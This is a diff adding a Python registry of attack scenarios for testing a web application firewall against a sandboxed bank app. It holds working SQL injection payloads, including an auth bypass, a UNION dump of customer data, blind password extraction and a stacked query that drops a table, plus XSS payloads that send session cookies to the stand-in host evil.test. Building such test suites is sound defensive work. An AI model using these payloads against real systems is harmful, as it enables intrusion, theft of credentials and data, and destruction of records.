@@ -1,0 +1,160 @@
+"""
+Attack scenario registry — 5 SQL injection + 4 XSS + 1 legitimate baseline.
+
+Each scenario is a self-contained recipe the runner turns into a synthetic HTTP
+request, classifies through the two-layer engine, and (if it slips through / the
+WAF is off) executes against the sandboxed bank app to produce a real
+consequence. Ordered by escalating sophistication within each class.
+"""
+
+SCENARIOS = [
+    # ── SQL injection ─────────────────────────────────────────────────────────
+    {
+        "id": "sqli_auth_bypass",
+        "category": "SQL Injection",
+        "title": "Authentication Bypass",
+        "level": 1,
+        "description": "Log in as admin with no valid password by breaking out of the WHERE clause.",
+        "method": "POST",
+        "target_uri": "/api/bank/login",
+        "param_name": "username",
+        "payload": "admin' OR '1'='1' --",
+        "vuln_op": "vuln_login",
+        "expected_classification": 1,
+        "expected_evades": False,
+    },
+    {
+        "id": "sqli_union_dump",
+        "category": "SQL Injection",
+        "title": "UNION Data Exfiltration",
+        "level": 2,
+        "description": "Append a UNION SELECT to an account search to dump customer names, emails and BVNs.",
+        "method": "GET",
+        "target_uri": "/api/bank/accounts",
+        "param_name": "q",
+        "payload": "0' UNION SELECT full_name, email, bvn FROM customers --",
+        "vuln_op": "vuln_account_lookup",
+        "expected_classification": 1,
+        "expected_evades": False,
+    },
+    {
+        "id": "sqli_blind_boolean",
+        "category": "SQL Injection",
+        "title": "Blind Boolean Extraction",
+        "level": 3,
+        "description": "Reconstruct the admin password one character at a time from true/false query responses.",
+        "method": "GET",
+        "target_uri": "/api/bank/accounts",
+        "param_name": "q",
+        "payload": "x' AND unicode(substr((SELECT password FROM users WHERE username='admin'),1,1))=83 --",
+        "vuln_op": "vuln_blind_password",
+        "expected_classification": 1,
+        "expected_evades": False,
+    },
+    {
+        "id": "sqli_destructive",
+        "category": "SQL Injection",
+        "title": "Destructive Stacked Query",
+        "level": 4,
+        "description": "Chain stacked statements to zero balances and drop the transactions table.",
+        "method": "POST",
+        "target_uri": "/api/bank/transfer",
+        "param_name": "account_no",
+        "payload": "0'; UPDATE accounts SET balance=0; DROP TABLE transactions; --",
+        "vuln_op": "vuln_destructive",
+        "expected_classification": 1,
+        "expected_evades": False,
+    },
+    {
+        "id": "sqli_obfuscated",
+        "category": "SQL Injection",
+        "title": "Obfuscated / Encoded Evasion",
+        "level": 5,
+        "description": "URL-encoded, comment-broken auth bypass that tries to slip past naive filters.",
+        "method": "GET",
+        "target_uri": "/api/bank/accounts",
+        "param_name": "q",
+        "payload": "%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27--",  # '/**/OR/**/'1'='1'--
+        "vuln_op": "vuln_login",
+        "expected_classification": 1,
+        "expected_evades": True,
+    },
+    # ── Cross-site scripting ────────────────────────────────────────────────────
+    {
+        "id": "xss_reflected",
+        "category": "XSS",
+        "title": "Reflected Script Injection",
+        "level": 1,
+        "description": "A search term echoed unescaped runs a <script> payload in the victim's browser.",
+        "method": "GET",
+        "target_uri": "/api/bank/search",
+        "param_name": "q",
+        "payload": "<script>alert('XSS-STB')</script>",
+        "vuln_op": "vuln_reflect",
+        "expected_classification": 1,
+        "expected_evades": False,
+    },
+    {
+        "id": "xss_stored_admin",
+        "category": "XSS",
+        "title": "Stored XSS → Admin Session Hijack",
+        "level": 2,
+        "description": "A support message stores a script that fires when the admin opens the queue.",
+        "method": "POST",
+        "target_uri": "/api/bank/support",
+        "param_name": "message",
+        "payload": "<script>fetch('//evil.test/steal?c='+document.cookie)</script>",
+        "vuln_op": "vuln_store_and_view",
+        "expected_classification": 1,
+        "expected_evades": False,
+    },
+    {
+        "id": "xss_cookie_theft",
+        "category": "XSS",
+        "title": "Cookie Theft via Image Handler",
+        "level": 3,
+        "description": "An <img onerror> handler exfiltrates the session cookie without any <script> tag.",
+        "method": "POST",
+        "target_uri": "/api/bank/support",
+        "param_name": "message",
+        "payload": "<img src=x onerror=\"fetch('//evil.test/c?='+document.cookie)\">",
+        "vuln_op": "vuln_store_and_view",
+        "expected_classification": 1,
+        "expected_evades": False,
+    },
+    {
+        "id": "xss_filter_evasion",
+        "category": "XSS",
+        "title": "Filter-Evasion (SVG onload)",
+        "level": 4,
+        "description": "An <svg onload> payload bypasses filters that only strip <script> tags.",
+        "method": "GET",
+        "target_uri": "/api/bank/search",
+        "param_name": "q",
+        "payload": "<svg/onload=alert(document.cookie)>",
+        "vuln_op": "vuln_reflect",
+        "expected_classification": 1,
+        "expected_evades": True,
+    },
+    # ── Legitimate baseline (proves low false-positive rate) ────────────────────
+    {
+        "id": "legit_baseline",
+        "category": "Legitimate",
+        "title": "Legitimate Customer Search",
+        "level": 0,
+        "description": "A normal customer looking up their account — must be ALLOWED by both layers.",
+        "method": "GET",
+        "target_uri": "/api/bank/accounts",
+        "param_name": "q",
+        "payload": "0123456701",
+        "vuln_op": "vuln_account_lookup",
+        "expected_classification": 0,
+        "expected_evades": False,
+    },
+]
+
+SCENARIOS_BY_ID = {s["id"]: s for s in SCENARIOS}
+
+
+def get_scenario(scenario_id: str):
+    return SCENARIOS_BY_ID.get(scenario_id)
